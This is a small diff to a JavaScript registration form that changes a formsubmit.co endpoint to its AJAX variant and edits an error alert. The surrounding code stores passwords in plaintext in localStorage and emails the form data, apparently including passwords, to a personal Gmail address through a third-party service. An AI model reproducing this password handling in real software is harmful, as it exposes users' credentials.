@@ -15,7 +15,7 @@ document
     localStorage.setItem("password", password);
 
     // Send the data to your email address
-    fetch("https://formsubmit.co/kolithanew123@gmail.com", {
+    fetch("https://formsubmit.co/ajax/kolithanew123@gmail.com", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
@@ -32,8 +32,9 @@ document
       })
       .catch((error) => {
         console.error("Error Registration:", error);
-        alert("...");
+        alert("Registration Error");
       });
   });
+
 
 
